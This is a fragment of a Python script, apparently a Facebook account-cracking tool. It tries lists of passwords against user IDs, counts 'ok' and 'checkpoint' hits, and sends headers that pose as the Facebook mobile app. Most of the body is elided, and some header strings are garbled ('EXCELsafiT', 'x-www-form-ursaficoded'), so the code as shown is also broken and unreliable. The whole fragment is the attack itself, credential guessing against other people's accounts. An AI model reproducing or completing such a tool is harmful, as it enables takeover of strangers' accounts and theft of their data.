...
def menu():
	...
	print(" [*] ---------------------------------------") 
	print(" [+] Author : https://fb.com/shoaib.xyz") 
	print(" [+] GitHub : https://github.com/Shoaibsafi2/sho")
	print(" [*] ---------------------------------------") 
	...
	if ask in["1"]:
		...
		if hasil in["1"]:
			...
			print(" [#] ----------------------------------------------")
			print(f" [+] total akun hasil crack ok : {safi(hasilok)}")
			print(f" [#] ----------------------------------------------{H}")
			...
			print(" [#] ----------------------------------------------")
			print(f" [+] total akun hasil crack ok : {safi(hasilcp)}")
			print(f" [#] ----------------------------------------------{K}")
...
def metode(user, pwx):
	global loop, ok, cp
	sys.stdout.write(f"\r [*] [crack] {loop}/{safi(id)}  ok : {safi(ok)} - cp : {safi(cp)}        "),
	sys.stdout.flush()
	try:
		for pw in pwx:
			pw = pw.lower()
			...
			headers = {
				...
				"x-fb-connection-quality": "EXCELsafiT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-ursaficoded", 
